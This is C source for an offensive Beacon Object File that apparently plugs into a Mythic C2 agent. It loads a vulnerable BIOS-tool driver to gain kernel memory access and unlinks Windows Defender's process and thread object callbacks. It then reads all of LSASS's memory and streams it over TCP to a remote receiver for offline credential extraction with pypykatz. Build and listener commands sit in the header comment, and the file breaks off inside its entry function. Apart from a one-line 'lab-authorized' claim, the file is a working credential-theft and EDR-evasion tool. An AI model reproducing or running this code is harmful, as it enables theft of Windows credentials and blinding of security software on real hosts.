/*
 * byovd_dump_bof.c - BYOVD LSASS credential dump BOF for Kassandra Mythic agent
 *
 * Execution via Kassandra executeBOF command. Runs entirely in-memory inside
 * the agent process. No child process, no disk artifact for the dump.
 *
 * What it does:
 *   1. Writes BiosToolCommonDriver.sys to %TEMP% (needed for NtLoadDriver)
 *   2. Loads driver via NtLoadDriver + registry service key
 *   3. Opens device handle -> kernel R/W via physical memory IOCTLs
 *   4. Patches WdFilter ObCallbacks (Process + Thread) via OBJECT_TYPE.CallbackList unlink
 *   5. Opens LSASS with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
 *   6. VirtualQueryEx + ReadProcessMemory over all committed readable regions
 *   7. Streams [base:8][size:8][data:N] records directly to TCP receiver (no dump file on disk)
 *   8. Cleanup: unload driver, delete service key, delete temp .sys
 *
 * Offline extraction on analyst box:
 *   nc -lvp 9999 > lsass_raw.bin   (on receiver before running BOF)
 *   python3 tools/rpm2minidump.py lsass_raw.bin lsass.dmp
 *   pypykatz lsa minidump lsass.dmp
 *
 * Kassandra usage (executeBOF):
 *   file_id: byovd_dump_bof.o
 *   parameters: bin:<base64_BiosToolCommonDriver.sys> str:<receiver_ip> int:<receiver_port>
 *
 * Build:
 *   MinGW (macOS/Linux cross-compile):
 *     x86_64-w64-mingw32-gcc -c byovd_dump_bof.c -o byovd_dump_bof.o \
 *       -masm=intel -Wall -Wno-unused-function
 *
 *   MSVC (Windows):
 *     cl /c /GS- /Gs9999999 /W3 byovd_dump_bof.c /Fo:byovd_dump_bof.obj
 *
 * Requires: Administrator + SeLoadDriverPrivilege on target host.
 * Lab-authorized BYOVD research tool. Isolated lab use only.
 */

#include <winsock2.h>   /* must precede windows.h */
#include <windows.h>
#include <tlhelp32.h>

/* ============================================================================
 * BOF Beacon API
 * ============================================================================ */
typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} datap;

void  BeaconPrintf(int type, const char *fmt, ...);
void  BeaconDataParse(datap *parser, char *buffer, int size);
char *BeaconDataExtract(datap *parser, int *size);
char *BeaconDataPtr(datap *parser, int size);
int   BeaconDataInt(datap *parser);

#define CALLBACK_OUTPUT 0x00
#define CALLBACK_ERROR  0x0d

/* ============================================================================
 * NT / Win32 type declarations
 * ============================================================================ */
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    LPWSTR Buffer;
} USTR_W;

/* use struct sockaddr_in directly from winsock2.h */

/* ============================================================================
 * External API declarations (BOF LIBRARY$Function convention)
 * ============================================================================ */

/* ntdll */
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtLoadDriver(USTR_W *RegistryPath);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtUnloadDriver(USTR_W *RegistryPath);
DECLSPEC_IMPORT PVOID    NTAPI NTDLL$RtlAllocateHeap(PVOID Heap, ULONG Flags, SIZE_T Size);
DECLSPEC_IMPORT BOOL     NTAPI NTDLL$RtlFreeHeap(PVOID Heap, ULONG Flags, PVOID Base);
DECLSPEC_IMPORT PVOID    NTAPI NTDLL$RtlProcessHeap(void);
DECLSPEC_IMPORT void     NTAPI NTDLL$RtlMoveMemory(PVOID dst, const PVOID src, SIZE_T n);
DECLSPEC_IMPORT void     NTAPI NTDLL$RtlZeroMemory(PVOID dst, SIZE_T n);

/* kernel32 */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTempPathW(DWORD,LPWSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$OpenProcessToken(HANDLE,DWORD,PHANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD,BOOL,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$VirtualQueryEx(HANDLE,LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$EnumDeviceDrivers(LPVOID*,DWORD,LPDWORD);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExA(LPCSTR,HANDLE,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE,LPCSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeviceIoControl(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32FirstW(HANDLE,LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32NextW(HANDLE,LPPROCESSENTRY32W);
DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT,DWORD,LPCSTR,int,LPWSTR,int);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT,DWORD,LPCWSTR,int,LPSTR,int,LPCSTR,LPBOOL);

/* advapi32 */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR,LPCSTR,PLUID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCreateKeyExW(HKEY,LPCWSTR,DWORD,LPWSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegSetValueExW(HKEY,LPCWSTR,DWORD,DWORD,const BYTE*,DWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegDeleteKeyW(HKEY,LPCWSTR);

/* ws2_32 */
DECLSPEC_IMPORT int          WINAPI WS2_32$WSAStartup(WORD,WSADATA*);
DECLSPEC_IMPORT int          WINAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT SOCKET       WINAPI WS2_32$socket(int,int,int);
DECLSPEC_IMPORT int          WINAPI WS2_32$connect(SOCKET,const struct sockaddr*,int);
DECLSPEC_IMPORT int          WINAPI WS2_32$send(SOCKET,const char*,int,int);
DECLSPEC_IMPORT int          WINAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT unsigned long WINAPI WS2_32$inet_addr(const char*);
DECLSPEC_IMPORT unsigned short WINAPI WS2_32$htons(unsigned short);

/* ============================================================================
 * Constants
 * ============================================================================ */
#define BIOSTOOL_READ_PHYS  0x22202Cu
#define BIOSTOOL_WRITE_PHYS 0x222030u
#define BIOSTOOL_VA2PA      0x222034u

/* OBJECT_TYPE.CallbackList offset (stable Win10/11) */
#define OBJ_TYPE_CALLBACK_LIST_OFF 0xC8

/* OB_CALLBACK_ENTRY field offsets */
#define CBENTRY_PRE_OP_OFF  0x28
#define CBENTRY_POST_OP_OFF 0x30

/* ntoskrnl PE header offsets for export directory */
#define NT_EXPORT_DIR_OFF 0x88   /* OptHeader RVA of export directory */

typedef unsigned long long QWORD;

/* ============================================================================
 * Globals (BOF lifetime only - zeroed on entry)
 * ============================================================================ */
static HANDLE  g_dev    = INVALID_HANDLE_VALUE;
static wchar_t g_svcName[64];
static wchar_t g_regPath[256];
static wchar_t g_drvPath[MAX_PATH];

/* ============================================================================
 * Inline helpers (no external calls)
 * ============================================================================ */
static void bof_wcs_copy(wchar_t *dst, const wchar_t *src) {
    while ((*dst++ = *src++) != 0);
}
static void bof_wcs_cat(wchar_t *dst, const wchar_t *src) {
    while (*dst) dst++;
    while ((*dst++ = *src++) != 0);
}
static int bof_wcs_len(const wchar_t *s) {
    int n = 0; while (*s++) n++; return n;
}
static void bof_str_uint(unsigned int v, char *buf) {
    char tmp[12]; int i = 0;
    if (!v) { buf[0] = '0'; buf[1] = 0; return; }
    while (v) { tmp[i++] = '0' + (v % 10); v /= 10; }
    int j;
    for (j = 0; j < i; j++) buf[j] = tmp[i-1-j];
    buf[i] = 0;
}
static void bof_str_to_wcs(const char *src, wchar_t *dst, int max) {
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, max);
}
static void *bof_alloc(SIZE_T n) {
    return NTDLL$RtlAllocateHeap(NTDLL$RtlProcessHeap(), 0, n);
}
static void bof_free(void *p) {
    if (p) NTDLL$RtlFreeHeap(NTDLL$RtlProcessHeap(), 0, p);
}
static void bof_memcpy(void *dst, const void *src, SIZE_T n) {
    NTDLL$RtlMoveMemory(dst, (PVOID)src, n);
}
static void bof_memset0(void *dst, SIZE_T n) {
    NTDLL$RtlZeroMemory(dst, n);
}

/* ============================================================================
 * Privilege helper
 * ============================================================================ */
static void EnablePriv(const char *name) {
    HANDLE hToken = NULL;
    if (!KERNEL32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    TOKEN_PRIVILEGES tp;
    bof_memset0(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (ADVAPI32$LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid))
        ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    KERNEL32$CloseHandle(hToken);
}

/* ============================================================================
 * Driver: write to disk, create service, NtLoadDriver
 * ============================================================================ */
static BOOL WriteDriver(const char *bytes, int len) {
    wchar_t tmpDir[MAX_PATH];
    DWORD pid = KERNEL32$GetCurrentProcessId();
    KERNEL32$GetTempPathW(MAX_PATH, tmpDir);

    /* build path: %TEMP%\bcd_<pid>.sys */
    char pidStr[16];
    bof_str_uint(pid, pidStr);

    bof_wcs_copy(g_drvPath, tmpDir);
    bof_wcs_cat(g_drvPath, L"bcd_");
    wchar_t wpid[16];
    bof_str_to_wcs(pidStr, wpid, 16);
    bof_wcs_cat(g_drvPath, wpid);
    bof_wcs_cat(g_drvPath, L".sys");

    HANDLE hf = KERNEL32$CreateFileW(g_drvPath, GENERIC_WRITE, 0, NULL,
                                     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteDriver CreateFile failed (%lu)\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }
    DWORD written = 0;
    BOOL ok = KERNEL32$WriteFile(hf, bytes, (DWORD)len, &written, NULL);
    KERNEL32$CloseHandle(hf);
    if (!ok || written != (DWORD)len) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteDriver WriteFile failed (%lu)\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Driver written to disk (%d bytes)\n", len);
    return TRUE;
}

static BOOL CreateSvcKey(void) {
    /* Service name: BiosTool_<pid> */
    char pidStr[16];
    bof_str_uint(KERNEL32$GetCurrentProcessId(), pidStr);

    bof_wcs_copy(g_svcName, L"BiosTool_");
    wchar_t wpid[16];
    bof_str_to_wcs(pidStr, wpid, 16);
    bof_wcs_cat(g_svcName, wpid);

    /* registry path for NtLoadDriver */
    bof_wcs_copy(g_regPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\");
    bof_wcs_cat(g_regPath, g_svcName);

    /* create key under HKLM\SYSTEM\...\Services\<svc> */
    wchar_t keyPath[256];
    bof_wcs_copy(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
    bof_wcs_cat(keyPath, g_svcName);

    HKEY hk = NULL;
    LONG rc = ADVAPI32$RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL,
                                       REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
                                       NULL, &hk, NULL);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] RegCreateKeyEx failed (%ld)\n", rc);
        return FALSE;
    }

    /* ImagePath: \??\<drvPath> */
    wchar_t imgPath[MAX_PATH + 8];
    bof_wcs_copy(imgPath, L"\\??\\");
    bof_wcs_cat(imgPath, g_drvPath);

    DWORD type = 1, start = 3, err = 1;
    ADVAPI32$RegSetValueExW(hk, L"Type",         0, REG_DWORD, (BYTE*)&type,  sizeof(type));
    ADVAPI32$RegSetValueExW(hk, L"Start",        0, REG_DWORD, (BYTE*)&start, sizeof(start));
    ADVAPI32$RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err,   sizeof(err));
    ADVAPI32$RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ,
                            (BYTE*)imgPath, (DWORD)((bof_wcs_len(imgPath) + 1) * 2));
    ADVAPI32$RegCloseKey(hk);
    return TRUE;
}

static BOOL LoadDriver(void) {
    USTR_W us;
    us.Buffer        = g_regPath;
    us.Length        = (USHORT)(bof_wcs_len(g_regPath) * 2);
    us.MaximumLength = us.Length + 2;
    NTSTATUS st = NTDLL$NtLoadDriver(&us);
    if (!NT_SUCCESS(st) && st != (LONG)0xC000010E) {   /* 0xC000010E = already loaded */
        BeaconPrintf(CALLBACK_ERROR, "[-] NtLoadDriver: 0x%08lX\n", (ULONG)st);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] NtLoadDriver: 0x%08lX\n", (ULONG)st);
    return TRUE;
}

static BOOL OpenDevice(void) {
    g_dev = KERNEL32$CreateFileA("\\\\.\\BiosToolCommonDriver",
                                 GENERIC_READ | GENERIC_WRITE, 0, NULL,
                                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenDevice failed (%lu)\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] BiosToolCommonDriver device open\n");
    return TRUE;
}

/* ============================================================================
 * Kernel R/W via BiosToolCommonDriver IOCTLs
 * ============================================================================ */
static PVOID Va2Pa(PVOID va) {
    struct { PVOID VA; PVOID PA; } req;
    req.VA = va; req.PA = NULL;
    DWORD ret = 0;
    KERNEL32$DeviceIoControl(g_dev, BIOSTOOL_VA2PA,
                             &req, sizeof(req), &req, sizeof(req), &ret, NULL);
    return req.PA;
}

static BOOL ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
    BYTE *pPA  = (BYTE*)pa;
    BYTE *pBuf = (BYTE*)buf;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pPA & 0xFFF;
        ULONG chunk = (ULONG)(size < (0x1000 - pageOff) ? size : (0x1000 - pageOff));
        struct { PVOID PA; ULONG Size; ULONG Pad; } req;
        req.PA = pPA; req.Size = chunk; req.Pad = 0;
        BYTE tmp[0x1008];
        DWORD got = 0;
        if (!KERNEL32$DeviceIoControl(g_dev, BIOSTOOL_READ_PHYS,
                                      &req, sizeof(req), tmp, sizeof(tmp), &got, NULL))
            return FALSE;
        bof_memcpy(pBuf, tmp + 8, chunk);
        pPA  += chunk;
        pBuf += chunk;
        size -= chunk;
    }
    return TRUE;
}

static BOOL WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    BYTE *pPA   = (BYTE*)pa;
    BYTE *pData = (BYTE*)data;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pPA & 0xFFF;
        ULONG chunk = (ULONG)(size < (0x1000 - pageOff) ? size : (0x1000 - pageOff));
        struct { ULONG Size; ULONG Pad; PVOID Data; PVOID PA; } req;
        req.Size = chunk; req.Pad = 0; req.Data = pData; req.PA = pPA;
        DWORD got = 0;
        if (!KERNEL32$DeviceIoControl(g_dev, BIOSTOOL_WRITE_PHYS,
                                      &req, sizeof(req), &req, sizeof(req), &got, NULL))
            return FALSE;
        pPA   += chunk;
        pData += chunk;
        size  -= chunk;
    }
    return TRUE;
}

static BOOL KRead(QWORD va, PVOID buf, SIZE_T size) {
    BYTE *pVA  = (BYTE*)(ULONG_PTR)va;
    BYTE *pBuf = (BYTE*)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)(size < 0x1000 ? size : 0x1000);
        PVOID pa = Va2Pa(pVA);
        if (!pa) return FALSE;
        if (!ReadPhys(pa, chunk, pBuf)) return FALSE;
        pVA  += chunk;
        pBuf += chunk;
        size -= chunk;
    }
    return TRUE;
}

static BOOL KWrite(QWORD va, PVOID buf, SIZE_T size) {
    BYTE *pVA   = (BYTE*)(ULONG_PTR)va;
    BYTE *pBuf  = (BYTE*)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)(size < 0x1000 ? size : 0x1000);
        PVOID pa = Va2Pa(pVA);
        if (!pa) return FALSE;
        if (!WritePhys(pa, chunk, pBuf)) return FALSE;
        pVA  += chunk;
        pBuf += chunk;
        size -= chunk;
    }
    return TRUE;
}

static QWORD KReadQ(QWORD va) {
    QWORD v = 0;
    KRead(va, &v, 8);
    return v;
}

/* ============================================================================
 * Kernel navigation helpers
 * ============================================================================ */

/* Read ntoskrnl export table to find a symbol's kernel VA. */
static QWORD FindNtosExport(QWORD ntosBase, const char *sym) {
    DWORD peOff = 0;
    KRead(ntosBase + 0x3C, &peOff, 4);
    if (!peOff || peOff > 0x1000) return 0;

    DWORD eDirRva = 0, numNames = 0, funcsRVA = 0, namesRVA = 0, ordsRVA = 0;
    KRead(ntosBase + peOff + NT_EXPORT_DIR_OFF, &eDirRva, 4);
    if (!eDirRva) return 0;
    QWORD eDir = ntosBase + eDirRva;
    KRead(eDir + 0x18, &numNames, 4);
    KRead(eDir + 0x1C, &funcsRVA, 4);
    KRead(eDir + 0x20, &namesRVA, 4);
    KRead(eDir + 0x24, &ordsRVA,  4);

    /* find sym name length */
    int targLen = 0;
    while (sym[targLen]) targLen++;

    DWORD i;
    for (i = 0; i < numNames && i < 100000; i++) {
        DWORD nameRVA = 0;
        KRead(ntosBase + namesRVA + (QWORD)i * 4, &nameRVA, 4);
        if (!nameRVA) continue;
        char buf[256];
        bof_memset0(buf, sizeof(buf));
        KRead(ntosBase + nameRVA, buf, (DWORD)(targLen + 2 < 255 ? targLen + 2 : 255));
        /* compare */
        int match = 1;
        int j;
        for (j = 0; j < targLen; j++) {
            if (buf[j] != sym[j]) { match = 0; break; }
        }
        if (match && buf[targLen] == 0) {
            WORD  ord     = 0;
            DWORD funcRVA = 0;
            KRead(ntosBase + ordsRVA  + (QWORD)i * 2, &ord,     2);
            KRead(ntosBase + funcsRVA + (QWORD)ord * 4, &funcRVA, 4);
            return ntosBase + funcRVA;
        }
    }
    return 0;
}

/* Unlink all entries from an OBJECT_TYPE.CallbackList (sets head.Flink = head.Blink = head). */
static void UnlinkCallbackList(const char *typeName, QWORD listHead) {
    QWORD flink = KReadQ(listHead);
    if (!flink || flink == listHead) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s CallbackList already empty\n", typeName);
        return;
    }
    /* count entries */
    int seen = 0;
    QWORD entry = flink;
    while (entry && entry != listHead && seen < 64) {
        entry = KReadQ(entry);   /* entry->Flink */
        seen++;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Unlinking %d %s callback(s)...\n", seen, typeName);
    /* point head at itself: head.Flink = head, head.Blink = head */
    QWORD self = listHead;
    KWrite(listHead,     &self, 8);
    KWrite(listHead + 8, &self, 8);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s ObCallbacks unlinked\n", typeName);
}

/* Patch WdFilter Process and Thread ObCallbacks. */
static BOOL PatchObCallbacks(QWORD ntosBase) {
    QWORD procTypePtr = FindNtosExport(ntosBase, "PsProcessType");
    if (!procTypePtr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] PsProcessType not found\n");
        return FALSE;
    }
    QWORD procObjType = KReadQ(procTypePtr);
    if (!procObjType) {
        BeaconPrintf(CALLBACK_ERROR, "[-] *PsProcessType NULL\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] OBJECT_TYPE(Process): 0x%llX\n",
                 (unsigned long long)procObjType);
    UnlinkCallbackList("Process", procObjType + OBJ_TYPE_CALLBACK_LIST_OFF);

    QWORD threadTypePtr = FindNtosExport(ntosBase, "PsThreadType");
    if (threadTypePtr) {
        QWORD threadObjType = KReadQ(threadTypePtr);
        if (threadObjType) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] OBJECT_TYPE(Thread): 0x%llX\n",
                         (unsigned long long)threadObjType);
            UnlinkCallbackList("Thread", threadObjType + OBJ_TYPE_CALLBACK_LIST_OFF);
        }
    }
    return TRUE;
}

/* Get ntoskrnl base (first driver returned by EnumDeviceDrivers). */
static QWORD GetNtosBase(void) {
    LPVOID drvs[1024];
    DWORD cb = 0;
    if (!KERNEL32$EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
    return (QWORD)drvs[0];
}

/* PsInitialSystemProcess offset from userland ntoskrnl.exe copy. */
static QWORD PsISPOffset(void) {
    HMODULE ntos = KERNEL32$LoadLibraryExA("ntoskrnl.exe", NULL,
                                           DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    FARPROC p = KERNEL32$GetProcAddress(ntos, "PsInitialSystemProcess");
    QWORD off = p ? ((QWORD)(ULONG_PTR)p - (QWORD)(ULONG_PTR)ntos) : 0;
    KERNEL32$FreeLibrary(ntos);
    return off;
}

/* ============================================================================
 * LSASS PID lookup
 * ============================================================================ */
static DWORD FindLsassPid(void) {
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe;
    bof_memset0(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (KERNEL32$Process32FirstW(snap, &pe)) {
        do {
            char nm[MAX_PATH];
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1,
                                         nm, MAX_PATH, NULL, NULL);
            /* case-insensitive compare "lsass.exe" */
            const char *a = nm, *b = "lsass.exe";
            int eq = 1;
            while (*a && *b) {
                char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
                char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
                if (ca != cb) { eq = 0; break; }
                a++; b++;
            }
            if (eq && !*a && !*b) { pid = pe.th32ProcessID; break; }
        } while (KERNEL32$Process32NextW(snap, &pe));
    }
    KERNEL32$CloseHandle(snap);
    return pid;
}

/* ============================================================================
 * DumpRpm + TCP exfil (streams directly - no dump file on disk)
 * ============================================================================ */
static int SendAll(SOCKET sock, const char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = WS2_32$send(sock, buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return sent;
}

static BOOL DumpAndSend(DWORD pid, const char *recvIp, int recvPort) {
    EnablePriv("SeDebugPrivilege");

    HANDLE hProc = KERNEL32$OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess LSASS (PID %lu) failed (%lu)\n",
                     pid, KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS handle (PID %lu)\n", pid);

    /* Winsock init */
    WSADATA wsaData;
    bof_memset0(&wsaData, sizeof(wsaData));
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WSAStartup failed\n");
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }

    SOCKET sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "[-] socket() failed\n");
        WS2_32$WSACleanup();
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }

    struct sockaddr_in sa;
    bof_memset0(&sa, sizeof(sa));
    sa.sin_family        = AF_INET;
    sa.sin_port          = WS2_32$htons((unsigned short)recvPort);
    sa.sin_addr.s_addr   = WS2_32$inet_addr(recvIp);
    if (WS2_32$connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] connect %s:%d failed\n", recvIp, recvPort);
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Connected to %s:%d\n", recvIp, recvPort);

    /* alloc scan buffer - 4MB chunks max */
    SIZE_T bufSz = 4 * 1024 * 1024;
    BYTE *scanBuf = (BYTE*)bof_alloc(bufSz);
    if (!scanBuf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] alloc scan buffer failed\n");
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }

    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = NULL;
    SIZE_T totalBytes = 0, regions = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DumpRpm: scanning LSASS VA space...\n");

    while (KERNEL32$VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT &&
            !(mbi.Protect & PAGE_GUARD) &&
            !(mbi.Protect & PAGE_NOACCESS)) {

            /* grow buffer if needed */
            if (mbi.RegionSize > bufSz) {
                bof_free(scanBuf);
                bufSz   = mbi.RegionSize + 4096;
                scanBuf = (BYTE*)bof_alloc(bufSz);
                if (!scanBuf) break;
            }

            SIZE_T bytesRead = 0;
            if (KERNEL32$ReadProcessMemory(hProc, mbi.BaseAddress,
                                           scanBuf, mbi.RegionSize, &bytesRead)
                && bytesRead > 0) {
                /* send header: [base:8LE][size:8LE] */
                QWORD base = (QWORD)(ULONG_PTR)mbi.BaseAddress;
                QWORD sz   = (QWORD)bytesRead;
                SendAll(sock, (char*)&base, 8);
                SendAll(sock, (char*)&sz,   8);
                SendAll(sock, (char*)scanBuf, (int)bytesRead);
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)(ULONG_PTR)addr < (QWORD)(ULONG_PTR)mbi.BaseAddress) break;
    }

    bof_free(scanBuf);
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
    KERNEL32$CloseHandle(hProc);

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] DumpRpm complete: %llu regions, %llu bytes streamed to %s:%d\n",
                 (unsigned long long)regions, (unsigned long long)totalBytes,
                 recvIp, recvPort);
    return totalBytes > 0;
}

/* ============================================================================
 * Cleanup
 * ============================================================================ */
static void Cleanup(void) {
    if (g_dev != INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(g_dev);
        g_dev = INVALID_HANDLE_VALUE;
    }

    if (g_regPath[0]) {
        USTR_W us;
        us.Buffer        = g_regPath;
        us.Length        = (USHORT)(bof_wcs_len(g_regPath) * 2);
        us.MaximumLength = us.Length + 2;
        NTSTATUS st = NTDLL$NtUnloadDriver(&us);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] NtUnloadDriver: 0x%08lX\n", (ULONG)st);

        /* delete service key */
        wchar_t keyPath[256];
        bof_wcs_copy(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
        bof_wcs_cat(keyPath, g_svcName);
        ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Service key deleted\n");
    }

    if (g_drvPath[0]) {
        KERNEL32$DeleteFileW(g_drvPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Driver file deleted\n");
    }
}

/* ============================================================================
 * BOF entrypoint
 * ============================================================================ */
void Go(char *args, int len) {
    /* zero globals */
    bof_memset0(g_svcName, sizeof(g_svcName));
    bof_memset0(g_regPath, sizeof(g_regPath));
    bof_memset0(g_drvPath, sizeof(g_drvPath));
    g_dev = INVALID_HANDLE_VALUE;

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] byovd_dump BOF starting (BYOVD LSASS credential extraction)\n");

    /* parse arguments */
    datap parser;
    BeaconDataParse(&parser, args, len);

    int   drvLen  = 0;
    char *drvData = BeaconDataExtract(&parser, &drvLen);  /* bin: driver bytes  */
